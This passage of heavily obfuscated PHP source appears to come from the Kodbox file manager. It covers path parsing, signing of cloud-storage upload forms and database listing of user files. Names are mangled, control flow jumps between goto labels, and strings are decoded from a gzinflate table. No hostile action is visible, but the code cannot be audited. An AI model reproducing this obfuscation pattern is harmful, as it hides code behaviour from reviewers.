json_encode($CùØºË¶ÜÉ[$Eá­æõ•ã¨[1025]]); self::setContent($DíÕ£»÷Ãù, $C³‹ï¸âµ”); if (count($CùØºË¶ÜÉ[$Eá­æõ•ã¨[1025]]) >= $d”éİ¯ò¸) { show_json(sprintf(LNG($Eá­æõ•ã¨[1029]), count($CùØºË¶ÜÉ[$Eá­æõ•ã¨[1025]])), !1); } goto a²òØé‡Ú”; a¿ÓìŒÅ¾ : } private static function fileExt($bõ™øï­½) { $b·Ïå¹¨°Å =& $_SERVER[õëù©û]; $e™¡¤Øá„ = $bõ™øï­½[$b·Ïå¹¨°Å[156]]; if ($e™¡¤Øá„ == $b·Ïå¹¨°Å[1032]) { $DµÇĞí³µŞ = $b·Ïå¹¨°Å[1033]; if (substr($bõ™øï­½[$b·Ïå¹¨°Å[28]], -strlen($DµÇĞí³µŞ)) == $DµÇĞí³µŞ) { $e™¡¤Øá„ = $b·Ïå¹¨°Å[1034]; } } self::archiveExt($e™¡¤Øá„); return $e™¡¤Øá„; } private static function zipFileList($d¨ğ‡óàÎ, $Déá¶šÌÕË = false) { $eö‰¤òËÑ =& $_SERVER[õëù©û]; $EŠê¿¶ ° = array(); foreach ($d¨ğ‡óàÎ as $a‚Ã”¸×”å) { $a›†£±¡ö = $a‚Ã”¸×”å[$eö‰¤òËÑ[75]]; if ($Déá¶šÌÕË) { $a›†£±¡ö = self::copy($a‚Ã”¸×”å[$eö‰¤òËÑ[75]], $Déá¶šÌÕË, $eö‰¤òËÑ[739]); } if ($a›†£±¡ö && self::local()->exist($a›†£±¡ö)) { $EŠê¿¶ °[$a‚Ã”¸×”å[$eö‰¤òËÑ[75]]] = $a›†£±¡ö; } } if (!empty($EŠê¿¶ °)) { return array_values($EŠê¿¶ °); } show_json(LNG($eö‰¤òËÑ[1035]), !1); } public static function tmpFileName($dó§öÎíø) { $e‚§é—òí‹ =& $_SERVER[õëù©û]; $E£å›—â£¶ = array($dó§öÎíø[$e‚§é—òí‹[28]], $dó§öÎíø[$e‚§é—òí‹[75]], $dó§öÎíø[$e‚§é—òí‹[77]], $dó§öÎíø[$e‚§é—òí‹[454]]); return md5(implode($e‚§é—òí‹[70], $E£å›—â£¶)); } private static function localFilePath($aÚä°¸ˆ, $Cìâ²îÌ»­) { goto Fæ—ìÄ¸–; bÊù’‡§®İ: if ($Bï‘í©Éî[$f¹ó—‰ Ñœ[29]] == KodIO::KOD_SOURCE) { $C±¤…Ğñ›Í = Model($f¹ó—‰ Ñœ[747])->fileInfoGet(KodIO::sourceID($aÚä°¸ˆ)); if (!$C±¤…Ğñ›Í[$f¹ó—‰ Ñœ[75]]) { show_json($f¹ó—‰ Ñœ[1038], !1); } $aÚä°¸ˆ = $C±¤…Ğñ›Í[$f¹ó—‰ Ñœ[75]]; } $F£ªù—¿µ‡ = self::init($aÚä°¸ˆ); $f¯Ñ¬…ÙÙ = $F£ªù—¿µ‡->getType(); goto DÍ‹Œæ“°ë; DÍ‹Œæ“°ë: if ($f¯Ñ¬…ÙÙ == $f¹ó—‰ Ñœ[101] || $f¯Ñ¬…ÙÙ == $f¹ó—‰ Ñœ[1039]) { if (!$F£ªù—¿µ‡->exist($F£ªù—¿µ‡->path)) { show_json(LNG($f¹ó—‰ Ñœ[100]), !1); } return $F£ªù—¿µ‡->path; } return !1; goto F¿ÇïËÉŞ; Fæ—ìÄ¸–: $f¹ó—‰ Ñœ =& $_SERVER[õëù©û]; if ($Cìâ²îÌ»­ == $f¹ó—‰ Ñœ[1036] && strtoupper(substr(PHP_OS, 0, 3)) == $f¹ó—‰ Ñœ[1037]) { return !1; } $Bï‘í©Éî = KodIO::parse($aÚä°¸ˆ); goto bÊù’‡§®İ; F¿ÇïËÉŞ: } private static function archiveExt($bĞ„¢î¹¬ = '') { $GLOBALS[$_SERVER[õëù©û][1040]] = $bĞ„¢î¹¬; } } class KodIO { const KOD_SOURCE = "\173\x73\x6f\165\x72\143\x65\175"; const KOD_USER_RECYCLE = "\x7b\x75\163\x65\x72\122\145\143\171\x63\x6c\x65\x7d"; const KOD_USER_FAV = "\173\x75\x73\145\162\106\x61\166\175"; const KOD_USER_FILE_TAG = "\173\x75\163\x65\x72\106\x69\x6c\x65\124\141\147\175"; const KOD_USER_FILE_TYPE = "\173\165\x73\145\162\106\x69\x6c\145\x54\171\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\157\x75\x70\122\x6f\157\x74\123\145\154\146\175"; const KOD_USER_SHARE = "\173\165\163\145\162\x53\x68\141\x72\145\175"; const KOD_USER_SHARE_LINK = "\173\165\163\145\x72\x53\x68\141\x72\145\114\x69\x6e\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\141\162\x65\x54\157\x4d\145\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\150\x61\162\145\x49\x74\145\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\163\x68\x61\x72\145\x49\x74\145\155\114\151\156\x6b\x7d"; const KOD_SEARCH = "\173\x73\145\x61\x72\x63\x68\175"; const KOD_BLOCK = "\173\142\x6c\x6f\143\x6b\x7d"; const KOD_IO = "\173\151\157\x7d"; const KOD_USER_RECENT = "\x7b\165\163\145\x72\122\145\156\x63\145\156\164\175"; const KOD_USER_DRIVER = "\173\144\x72\151\x76\145\162\175"; public static function typeList() { $eĞ¼Ü¾ïà„ =& $_SERVER[õëù©û]; return array($eĞ¼Ü¾ïà„[1041] => self::KOD_SOURCE, $eĞ¼Ü¾ïà„[1042] => self::KOD_USER_RECYCLE, $eĞ¼Ü¾ïà„[1043] => self::KOD_USER_FAV, $eĞ¼Ü¾ïà„[1044] => self::KOD_USER_FILE_TAG, $eĞ¼Ü¾ïà„[1045] => self::KOD_USER_FILE_TYPE, $eĞ¼Ü¾ïà„[1046] => self::KOD_GROUP_ROOT_SELF, $eĞ¼Ü¾ïà„[1047] => self::KOD_USER_SHARE, $eĞ¼Ü¾ïà„[1048] => self::KOD_USER_SHARE_LINK, $eĞ¼Ü¾ïà„[1049] => self::KOD_USER_SHARE_TO_ME, $eĞ¼Ü¾ïà„[1050] => self::KOD_SHARE_ITEM, $eĞ¼Ü¾ïà„[1051] => self::KOD_SHARE_LINK, $eĞ¼Ü¾ïà„[1052] => self::KOD_SEARCH, $eĞ¼Ü¾ïà„[1053] => self::KOD_BLOCK, $eĞ¼Ü¾ïà„[1054] => self::KOD_IO, $eĞ¼Ü¾ïà„[1055] => self::KOD_USER_RECENT, $eĞ¼Ü¾ïà„[1056] => self::KOD_USER_DRIVER); } public static function parse($DÆƒÈÊ‘¶) { goto eë”Ø›Ü©Ö; F„Í¿©õİÈ: $C¯•”õô‰ù = array($cñ–ÜÍŒò[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $a‚‡œ·õ½Ù[$cñ–ÜÍŒò[1061]] = in_array($a‚‡œ·õ½Ù[$cñ–ÜÍŒò[29]], $C¯•”õô‰ù); return $a‚‡œ·õ½Ù; goto F«áÄ°Ê‰; eë”Ø›Ü©Ö: $cñ–ÜÍŒò =& $_SERVER[õëù©û]; $DÆƒÈÊ‘¶ = self::clear($DÆƒÈÊ‘¶); $A•Öß…££Õ = array_values(self::typeList()); goto fğÃØ’„‚; fğÃØ’„‚: preg_match($cñ–ÜÍŒò[1057], $DÆƒÈÊ‘¶, $Aº”‹ÉË××); $a‚‡œ·õ½Ù = array($cñ–ÜÍŒò[384] => !1, $cñ–ÜÍŒò[1058] => !1, $cñ–ÜÍŒò[381] => !1, $cñ–ÜÍŒò[75] => $DÆƒÈÊ‘¶, $cñ–ÜÍŒò[1003] => !1, $cñ–ÜÍŒò[1002] => $cñ–ÜÍŒò[33]); if (is_array($Aº”‹ÉË××) && count($Aº”‹ÉË××) == 5) { $AÖéåÇ‰Å° = $cñ–ÜÍŒò[1059] . $Aº”‹ÉË××[2] . $cñ–ÜÍŒò[311]; if (in_array($AÖéåÇ‰Å°, $A•Öß…££Õ)) { $a‚‡œ·õ½Ù[$cñ–ÜÍŒò[1003]] = $Aº”‹ÉË××[1]; $a‚‡œ·õ½Ù[$cñ–ÜÍŒò[29]] = $AÖéåÇ‰Å°; $a‚‡œ·õ½Ù[$cñ–ÜÍŒò[1060]] = substr($AÖéåÇ‰Å°, 1, -1); $a‚‡œ·õ½Ù[$cñ–ÜÍŒò[363]] = $Aº”‹ÉË××[3]; } $a‚‡œ·õ½Ù[$cñ–ÜÍŒò[1002]] = $Aº”‹ÉË××[4]; } goto F„Í¿©õİÈ; F«áÄ°Ê‰: } public static function clear($C¨‡›èô) { goto e¹ÑÕ°˜é…; Dî‰ñÃ…é: if ($C¨‡›èô == $aôˆëŸäšË[8]) { return $aôˆëŸäšË[8]; } $C¨‡›èô = rtrim($C¨‡›èô, $aôˆëŸäšË[8]); return $C¨‡›èô; goto CÇ¥ğ‘Ûİ…; e¹ÑÕ°˜é…: $aôˆëŸäšË =& $_SERVER[õëù©û]; $C¨‡›èô = str_replace($aôˆëŸäšË[93], $aôˆëŸäšË[8], $C¨‡›èô); $F™–«åŒ = $aôˆëŸäšË[1062]; goto F†Ùæ²©‹ƒ; F†Ùæ²©‹ƒ: if (substr($C¨‡›èô, 0, 3) == $aôˆëŸäšË[1063]) { $C¨‡›èô = substr($C¨‡›èô, 3); } while (strstr($C¨‡›èô, $F™–«åŒ)) { $C¨‡›èô = str_replace($F™–«åŒ, $aôˆëŸäšË[8], $C¨‡›èô); } $C¨‡›èô = preg_replace($aôˆëŸäšË[1064], $aôˆëŸäšË[8], $C¨‡›èô); goto Dî‰ñÃ…é; CÇ¥ğ‘Ûİ…: } public static function sourceID($b¹Á§®ÎÀ) { $Bé½Óëì =& $_SERVER[õëù©û]; $a–¬×é™ğë = self::parse($b¹Á§®ÎÀ); if ($a–¬×é™ğë[$Bé½Óëì[29]] !== self::KOD_SOURCE) { show_json(LNG($Bé½Óëì[1065]), !1); } return $a–¬×é™ğë[$Bé½Óëì[363]]; } public static function make($dÎ×™±Œ–) { if (!$dÎ×™±Œ–) { return !1; } return self::makePath(self::KOD_SOURCE, intval($dÎ×™±Œ–)); } public static function makeShare($a“½èá“‚, $BÕÀ³£œÑè) { return self::makePath(self::KOD_SHARE_ITEM, $a“½èá“‚, $BÕÀ³£œÑè); } public static function makeFileTypePath($F¥Ê†æ—àˆ) { return self::makePath(self::KOD_USER_FILE_TYPE, $F¥Ê†æ—àˆ); } public static function makeFileTagPath($F÷ÀáŒâ‹) { return self::makePath(self::KOD_USER_FILE_TAG, $F÷ÀáŒâ‹); } public static function makePath($eÙ§¨ƒ, $cŞóÎŠ£– = '', $FÙ£‚¸…ñË = '') { $Dª–î³…ÒŸ =& $_SERVER[õëù©û]; $aÇŞ‘¿îÊ = substr($eÙ§¨ƒ, 1, -1); $aÀ°š±¢®ó = $Dª–î³…ÒŸ[1066] . $aÇŞ‘¿îÊ . $Dª–î³…ÒŸ[1067] . $cŞóÎŠ£– . $Dª–î³…ÒŸ[1068]; $aÀ°š±¢®ó = $FÙ£‚¸…ñË ? $aÀ°š±¢®ó . $FÙ£‚¸…ñË . $Dª–î³…ÒŸ[8] : $aÀ°š±¢®ó; return $aÀ°š±¢®ó; } public static function hashPath($CÜÃ¨Ì±Ô) { $d—¨ÍÛİ«Ê =& $_SERVER[õëù©û]; $CÖÒñ¶—°ˆ = is_array($CÜÃ¨Ì±Ô) ? $CÜÃ¨Ì±Ô : IO::info($CÜÃ¨Ì±Ô); $FŠ¡Â¢Ğå“ = _get($CÖÒñ¶—°ˆ, $d—¨ÍÛİ«Ê[1069], $d—¨ÍÛİ«Ê[33]); if (!$FŠ¡Â¢Ğå“) { $C¨»å¤â°” = KodIO::parse($CÖÒñ¶—°ˆ[$d—¨ÍÛİ«Ê[75]]); if (!$C¨»å¤â°”[$d—¨ÍÛİ«Ê[29]]) { $FŠ¡Â¢Ğå“ = IO::hashSimple($CÖÒñ¶—°ˆ[$d—¨ÍÛİ«Ê[75]]); } } if (!$FŠ¡Â¢Ğå“) { $FŠ¡Â¢Ğå“ = md5($CÖÒñ¶—°ˆ[$d—¨ÍÛİ«Ê[75]] . $CÖÒñ¶—°ˆ[$d—¨ÍÛİ«Ê[77]] . $CÖÒñ¶—°ˆ[$d—¨ÍÛİ«Ê[106]]); } return $FŠ¡Â¢Ğå“; } public static function initSystemPath() { $E™°ĞëøÈ” =& $_SERVER[õëù©û]; if (defined($E™°ĞëøÈ”[1070])) { return; } define($E™°ĞëøÈ”[1070], self::systemPath($E™°ĞëøÈ”[1071])); define($E™°ĞëøÈ”[1072], self::systemPath($E™°ĞëøÈ”[1073])); define($E™°ĞëøÈ”[1074], self::systemPath($E™°ĞëøÈ”[1075])); define($E™°ĞëøÈ”[1076], self::systemPath($E™°ĞëøÈ”[1077])); } private static function systemPath($eëÈËß°ìÄ) { goto aù©÷ëìù‚; CŠÛÍÊåÛè: return $CçªŞ±‹ƒø; goto EÃˆ¿“î‘Â; Bù¨ééâ˜Ô: if ($CçªŞ±‹ƒø) { return $CçªŞ±‹ƒø; } if ($eëÈËß°ìÄ == $AšÓ«Ÿ“¦å[1071]) { $CçªŞ±‹ƒø = self::make(Model($AšÓ«Ÿ“¦å[747])->systemRootPathAdd($AšÓ«Ÿ“¦å[1080])); } else { $CçªŞ±‹ƒø = self::systemPath($AšÓ«Ÿ“¦å[1071]); $cÑ˜¦éôñÙ = self::sourceID($CçªŞ±‹ƒø); $CçªŞ±‹ƒø = self::make(Model($AšÓ«Ÿ“¦å[747])->mkdir($cÑ˜¦éôñÙ, $eëÈËß°ìÄ)); } Model($AšÓ«Ÿ“¦å[1079])->set($DÛª³ÔÅÙ¿, $CçªŞ±‹ƒø); goto CŠÛÍÊåÛè; aù©÷ëìù‚: $AšÓ«Ÿ“¦å =& $_SERVER[õëù©û]; $DÛª³ÔÅÙ¿ = $AšÓ«Ÿ“¦å[1078] . ucfirst($eëÈËß°ìÄ); $CçªŞ±‹ƒø = Model($AšÓ«Ÿ“¦å[1079])->get($DÛª³ÔÅÙ¿); goto Bù¨ééâ˜Ô; EÃˆ¿“î‘Â: } public static function systemFolder($fÏî÷ù…‚–) { $d›â×¨ÚÜï = IO_PATH_SYSTEM_SOURCE . $fÏî÷ù…‚–; $bµñÁ“çºå = Cache::get($d›â×¨ÚÜï); if (!$bµñÁ“çºå) { $eÄ…ô‹œà• = IO::infoFull($d›â×¨ÚÜï); if (!$eÄ…ô‹œà•) { $bµñÁ“çºå = IO::mkdir($d›â×¨ÚÜï, REPEAT_SKIP); } else { $bµñÁ“çºå = $eÄ…ô‹œà•[$_SERVER[õëù©û][75]]; } Cache::set($d›â×¨ÚÜï, $bµñÁ“çºå, 3600 * 10); } return $bµñÁ“çºå; } public static function defaultDriver() { return Model($_SERVER[õëù©û][699])->defaultDriver(); } public static function defaultIO() { $c§­«èµ‚‚ =& $_SERVER[õëù©û]; $C³ø±ŠĞ£ = self::defaultDriver(); return $c§­«èµ‚‚[1081] . $C³ø±ŠĞ£[$c§­«èµ‚‚[363]] . $c§­«èµ‚‚[1068]; } public static function fileTypeList() { $dŞÚ»‹½ùÖ =& $_SERVER[õëù©û]; $DíÎ»£Ö«” = $GLOBALS[$dŞÚ»‹½ùÖ[6]][$dŞÚ»‹½ùÖ[1082]]; foreach ($DíÎ»£Ö«” as $BˆŸõß¾â => $fœõø…œõ÷) { $Fš³¥ù‰†Š = $dŞÚ»‹½ùÖ[1083] . $BˆŸõß¾â; $F ï¬Ô™ = LNG($Fš³¥ù‰†Š); if ($Fš³¥ù‰†Š != $F ï¬Ô™) { $DíÎ»£Ö«”[$BˆŸõß¾â][$dŞÚ»‹½ùÖ[28]] = $F ï¬Ô™; } } return $DíÎ»£Ö«”; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($aˆ‡òµ Öè) { parent::__construct($aˆ‡òµ Öè); $this->signatureVersion($_SERVER[õëù©û][196]); } public function uploadFormData($EõªÛÚÇ‰İ, $F×õÓ®ÕÎ = 3600) { goto eÓ¥•–¹Ş; e÷ğ›ÀÒŠ«: $b®¢ë™Ùóé = sha1($bĞè’¸ÒÈÑ); $CŒÑÇ†Çë = hash_hmac($b–Âš’ùÎ‰[214], $b®¢ë™Ùóé, $a¥œØç˜ê¯); $c‚Á¿â©ÈÁ = array($b–Âš’ùÎ‰[1088] => $aêø’”…Øƒ, $b–Âš’ùÎ‰[1092] => $Dœî˜£Ê„†, $b–Âš’ùÎ‰[1096] => base64_encode($bĞè’¸ÒÈÑ), $b–Âš’ùÎ‰[1093] => $AÉ“ĞÊ¸é», $b–Âš’ùÎ‰[1094] => $this->accessKey, $b–Âš’ùÎ‰[1097] => $Fê¢™í¸„Ã, $b–Âš’ùÎ‰[1098] => $CŒÑÇ†Çë, $b–Âš’ùÎ‰[165] => $this->getHost()); goto Aâî²×‘Î; dõµÊ¬ÍŸ¿: $bĞè’¸ÒÈÑ = array($b–Âš’ùÎ‰[1086] => $aÆ½ÚÂ¢Ò¬, $b–Âš’ùÎ‰[1087] => array(array($b–Âš’ùÎ‰[1088] => $aêø’”…Øƒ), array($b–Âš’ùÎ‰[1089] => $this->bucket), array($b–Âš’ùÎ‰[1090], $b–Âš’ùÎ‰[1091], $b–Âš’ùÎ‰[33]), array($b–Âš’ùÎ‰[1092] => $Dœî˜£Ê„†), array($b–Âš’ùÎ‰[1093] => $AÉ“ĞÊ¸é»), array($b–Âš’ùÎ‰[1094] => $this->accessKey), array($b–Âš’ùÎ‰[1095] => $Fê¢™í¸„Ã))); $bĞè’¸ÒÈÑ = json_encode($bĞè’¸ÒÈÑ); $a¥œØç˜ê¯ = hash_hmac($b–Âš’ùÎ‰[214], $Fê¢™í¸„Ã, $this->secret); goto e÷ğ›ÀÒŠ«; eÓ¥•–¹Ş: $b–Âš’ùÎ‰ =& $_SERVER[õëù©û]; $aêø’”…Øƒ = $b–Âš’ùÎ‰[181]; $AÉ“ĞÊ¸é» = $b–Âš’ùÎ‰[214]; goto CÇƒ´Ÿæ°Á; CÇƒ´Ÿæ°Á: $Dœî˜£Ê„† = $b–Âš’ùÎ‰[1084]; $aÆ½ÚÂ¢Ò¬ = gmdate($b–Âš’ùÎ‰[1085], time() + $F×õÓ®ÕÎ); $Fê¢™í¸„Ã = (string) time() . $b–Âš’ùÎ‰[67] . (string) (time() + $F×õÓ®ÕÎ); goto dõµÊ¬ÍŸ¿; Aâî²×‘Î: return $c‚Á¿â©ÈÁ; goto FİšƒŸ»á; FİšƒŸ»á: } public function fileOutLink($d•ÁÃäª¡ˆ) { $D´×ôêÏ³ª =& $_SERVER[õëù©û]; if (substr($d•ÁÃäª¡ˆ, 0, 7) == $D´×ôêÏ³ª[1099]) { $d•ÁÃäª¡ˆ = $D´×ôêÏ³ª[1100] . substr($d•ÁÃäª¡ˆ, 7); } header($D´×ôêÏ³ª[152] . $d•ÁÃäª¡ˆ); die; } } goto bŒ†·Ï‘‡½; b–³”ÇÙ±: $fÁŸŠ™Œ‡ğ = $_SERVER[õëù©û][542]; $_SERVER[ÀÜ¸â¬òüƒÇÚ] = explode($_SERVER[õëù©û][543], gzinflate(substr($_SERVER[õëù©û][544], 10, -8))); $E·¡²•Æ‹Ğ = $_SERVER[õëù©û][545]; goto Dá‘Îè¨êİ; FñÀ—Š™Ü: define($_SERVER[õëù©û][1898], 3); define($_SERVER[õëù©û][1899], 4); define($_SERVER[õëù©û][1900], 5); goto B¸²‡Øš²ñ; CÈƒæ—óòÓ: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\x75\x72\143\145"; protected $tableMeta = array("\164\141\142\x6c\145\x4e\141\155\145" => "\x69\x6f\x5f\163\x6f\165\162\x63\x65\137\x6d\x65\164\141", "\x6d\x65\164\x61\106\x69\145\x6c\x64" => "\x73\157\165\162\143\145\111\x44"); protected $dataAuto = array(array("\155\x6f\x64\x69\146\x79\x54\x69\155\x65", "\x74\151\x6d\x65", "\x69\x6e\163\x65\x72\164", "\x66\x75\156\x63\164\x69\x6f\156"), array("\x63\162\x65\141\x74\x65\124\151\x6d\145", "\x74\x69\x6d\145", "\x69\156\163\145\x72\x74", "\146\165\x6e\143\x74\151\157\156"), array("\166\x69\145\x77\124\x69\155\x65", "\164\x69\155\x65", "\x69\156\x73\x65\162\x74", "\146\165\x6e\143\x74\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($a‡‚¨ßê ±) { return $this->listSource(array($_SERVER[õëù©û][364] => $a‡‚¨ßê ±)); } public function typeName($eëš®ğÃöë) { static $Bì…ãñ™Õ = array(self::TYPE_SYSTEM => "\x73\171\163\164\145\x6d", self::TYPE_USER => "\x75\163\x65\162", self::TYPE_GROUP => "\x67\162\x6f\x75\x70"); return $Bì…ãñ™Õ[$eëš®ğÃöë . $_SERVER[õëù©û][33]]; } public function sourceListInfo($c½„åº­–, $càÅºÉñë = false) { goto a—¹‹Û‰ÎÙ; a—¹‹Û‰ÎÙ: $f¶‡ÑŞ³¸ =& $_SERVER[õëù©û]; $c½„åº­– = $c½„åº­– ? $c½„åº­– : array(); $c½„åº­– = array_filter(array_unique($c½„åº­–)); goto EĞƒÔµÍ¨ˆ; C×ŸÏâ®¬¥: return array_to_keyvalue($Cˆ¦›Èğ“, $f¶‡ÑŞ³¸[365]); goto A—»Ï‰™²–; EĞƒÔµÍ¨ˆ: if (!$c½„åº­–) { return array(); } $Cˆ¦›Èğ“ = $this->where(array($f¶‡ÑŞ³¸[365] => array($f¶‡ÑŞ³¸[7], $c½„åº­–)))->select(); $this->_listDataApply($Cˆ¦›Èğ“, $càÅºÉñë); goto C×ŸÏâ®¬¥; A—»Ï‰™²–: } public function pathInfoFilter($b¦Í°Š·—å) { goto FğøâÛŞŞš; FğøâÛŞŞš: $ağ£Î¶¼‹ =& $_SERVER[õëù©û]; $b¦Í°Š·—å[$ağ£Î¶¼‹[75]] = KodIO::make($b¦Í°Š·—å[$ağ£Î¶¼‹[365]]); $b¦Í°Š·—å[$ağ£Î¶¼‹[29]] = $b¦Í°Š·—å[$ağ£Î¶¼‹[366]] == 1 ? $ağ£Î¶¼‹[76] : $ağ£Î¶¼‹[163]; goto a¡ñÃÁŠèİ; C®µêÜ Ó: $A¡š­·Ôæ .= $ağ£Î¶¼‹[370]; $A¡š­·Ôæ .= $ağ£Î¶¼‹[371]; $cªÎíâ¨ã = explode($ağ£Î¶¼‹[47], $A¡š­·Ôæ); goto dÉ»íƒçÈÕ; a¡ñÃÁŠèİ: $b¦Í°Š·—å[$ağ£Î¶¼‹[367]] = $this->typeName($b¦Í°Š·—å[$ağ£Î¶¼‹[367]]); if ($b¦Í°Š·—å[$ağ£Î¶¼‹[366]] != 1) { $b¦Í°Š·—å[$ağ£Î¶¼‹[156]] = $b¦Í°Š·—å[$ağ£Î¶¼‹[368]]; unset($b¦Í°Š·—å[$ağ£Î¶¼‹[368]]); } $A¡š­·Ôæ = $ağ£Î¶¼‹[369]; goto C®µêÜ Ó; dÉ»íƒçÈÕ: if (isset($b¦Í°Š·—å[$ağ£Î¶¼‹[372]]) && $b¦Í°Š·—å[$ağ£Î¶¼‹[372]][$ağ£Î¶¼‹[373]] == -1) { $cªÎíâ¨ã = array_remove_value($cªÎíâ¨ã, $ağ£Î¶¼‹[183]); $cªÎíâ¨ã = array_remove_value($cªÎíâ¨ã, $ağ£Î¶¼‹[106]); $cªÎíâ¨ã = array_remove_value($cªÎíâ¨ã, $ağ£Î¶¼‹[374]); $cªÎíâ¨ã = array_remove_value($cªÎíâ¨ã, $ağ£Î¶¼‹[375]); $cªÎíâ¨ã = array_remove_value($cªÎíâ¨ã, $ağ£Î¶¼‹[77]); $cªÎíâ¨ã = array_remove_value($cªÎíâ¨ã, $ağ£Î¶¼‹[376]); } $b¦Í°Š·—å = array_field_key($b¦Í°Š·—å, $cªÎíâ¨ã); return $b¦Í°Š·—å; goto CÇÆ³Ñ±İ›; CÇÆ³Ñ±İ›: } public function listUserFav() { goto f¤ñ‡§õ±; f¤ñ‡§õ±: $Bî®Ç«ğ³ =& $_SERVER[õëù©û]; $CÔà™ƒì´¿ = Model($Bî®Ç«ğ³[377])->listData(); $B‹ç°æ°œó = array_filter_by_field($CÔà™ƒì´¿, $Bî®Ç«ğ³[29], $Bî®Ç«ğ³[378]); goto CÆĞŠ†Ì§…; B©£†Ğ³‘: foreach ($CÔà™ƒì´¿ as &$D‰ê ôÁØ) { $D‰ê ôÁØ = array($Bî®Ç«ğ³[381] => $D‰ê ôÁØ[$Bî®Ç«ğ³[363]], $Bî®Ç«ğ³[382] => $D‰ê ôÁØ[$Bî®Ç«ğ³[28]], $Bî®Ç«ğ³[383] => $D‰ê ôÁØ[$Bî®Ç«ğ³[75]], $Bî®Ç«ğ³[384] => $D‰ê ôÁØ[$Bî®Ç«ğ³[29]], $Bî®Ç«ğ³[385] => $D‰ê ôÁØ[$Bî®Ç«ğ³[183]], $Bî®Ç«ğ³[386] => $D‰ê ôÁØ[$Bî®Ç«ğ³[106]]); if ($D‰ê ôÁØ[$Bî®Ç«ğ³[29]] == $Bî®Ç«ğ³[378] && $CàÆ˜é‹Œ[$D‰ê ôÁØ[$Bî®Ç«ğ³[75]]]) { $D‰ê ôÁØ[$Bî®Ç«ğ³[387]] = $CàÆ˜é‹Œ[$D‰ê ôÁØ[$Bî®Ç«ğ³[75]]]; } } return $CÔà™ƒì´¿; goto AŒÍÀ¨¡; CÆĞŠ†Ì§…: $B‹ç°æ°œó = array_to_keyvalue($B‹ç°æ°œó, $Bî®Ç«ğ³[33], $Bî®Ç«ğ³[75]); if ($B‹ç°æ°œó) { $CàÆ˜é‹Œ = $this->listSource(array($Bî®Ç«ğ³[379] => array($Bî®Ç«ğ³[380], $B‹ç°æ°œó))); } $CàÆ˜é‹Œ = array_to_keyvalue($CàÆ˜é‹Œ[$Bî®Ç«ğ³[350]], $Bî®Ç«ğ³[365]); goto B©£†Ğ³‘; AŒÍÀ¨¡: } public function listUserTag($CÔê‡ÁÔÑÒ) { goto eë®¿æµ‘; f¿ÖÙº«ğõ: $cÀ•ÛÆè¥½ = array_to_keyvalue($cÀ•ÛÆè¥½, $a‰—¶ïÌöö[33], $a‰—¶ïÌöö[75]); if (!$cÀ•ÛÆè¥½) { return array(); } $D£ƒ¥¬•È¨ = array($a‰—¶ïÌöö[379] => array($a‰—¶ïÌöö[380], $cÀ•ÛÆè¥½)); goto d·¿ Ò¿Şñ; d·¿ Ò¿Şñ: return $this->listSource($D£ƒ¥¬•È¨); goto aƒ”µ¿ç¡; eë®¿æµ‘: $a‰—¶ïÌöö =& $_SERVER[õëù©û]; $BÒë•…ºµÈ = Model($a‰—¶ïÌöö[388])->listData(); $cÀ•ÛÆè¥½ = array_filter_by_field($BÒë•…ºµÈ, $a‰—¶ïÌöö[389], $CÔê‡ÁÔÑÒ); goto f¿ÖÙº«ğõ; aƒ”µ¿ç¡: } public function listUserRecycle() { $Aª´ÅßÑñ† =& $_SERVER[õëù©û]; $eíêÜè³†¸ = Model($Aª´ÅßÑñ†[390])->listData(); if (!$eíêÜè³†¸) { return array(); } $a¶Ÿšƒ«óˆ = array($Aª´ÅßÑñ†[379] => array($Aª´ÅßÑñ†[380], $eíêÜè³†¸), $Aª´ÅßÑñ†[391] => 1); return $this->listSource($a¶Ÿšƒ«óˆ); } public function listSource($CŒõ›î™®, $F¿³…‘¾— = 3000) { goto aÁŸÑçóğ•; aÁŸÑçóğ•: $e«ƒ‰Ş¾×Õ =& $_SERVER[õëù©û]; if (!isset($CŒõ›î™®[$e«ƒ‰Ş¾×Õ[392]])) { $CŒõ›î™®[$e«ƒ‰Ş¾×Õ[392]] = 0; } $eòŠÖ¦ÎÜ = $e«ƒ‰Ş¾×Õ[393]; goto c‹ëÎ¬œ®Œ; F¸ÖÀ¢ï¤: return $d¹’—ŞÒ‚å; goto Bä‘Ü²Óµ; c‹ëÎ¬œ®Œ: $d¹’—ŞÒ‚å = $this->field($eòŠÖ¦ÎÜ)->_makeOrder()->where($CŒõ›î™®)->selectPage($F¿³…‘¾—); $this->_listDataApply($d¹’—ŞÒ‚å[$e«ƒ‰Ş¾×Õ[350]]); $this->_listMake($d¹’—ŞÒ‚å); goto F¸ÖÀ¢ï¤; Bä‘Ü²Óµ: } protected function _makeOrder() { goto A÷óœ™°½×; C¯—›ñ””ä: $eÓ”Ô…¨—Ã = Input::get($bèè³Ë×Â[403], $bèè³Ë×Â[7], $fƒ“Ì¹¤ê, array_keys($FÊßä°ìÁÆ)); if (!in_array($A”Ó»ÎŠ‰‹, array_keys($CŞéÚ²))) { $A”Ó»ÎŠ‰‹ = $bèè³Ë×Â[28]; } if (!in_array($eÓ”Ô…¨—Ã, array_keys($FÊßä°ìÁÆ))) { $A”Ó»ÎŠ‰‹ = $bèè³Ë×Â[397]; } goto eªìÃíï—¼; eªìÃíï—¼: if ($A”Ó»ÎŠ‰‹ == $bèè³Ë×Â[28]) { } $Aƒ“ì©ğç = $bèè³Ë×Â[404] . $CŞéÚ²[$A”Ó»ÎŠ‰‹] . $bèè³Ë×Â[50] . $FÊßä°ìÁÆ[$eÓ”Ô…¨—Ã]; return $this->order(rtrim(trim($Aƒ“ì©ğç), $bèè³Ë×Â[47])); goto FÊ“Ş†¡‰; Dâ¥’»ÜŒ´: $FÊßä°ìÁÆ = array($bèè³Ë×Â[397] => $bèè³Ë×Â[398], $bèè³Ë×Â[399] => $bèè³Ë×Â[400]); $CŞéÚ² = array($bèè³Ë×Â[28] => 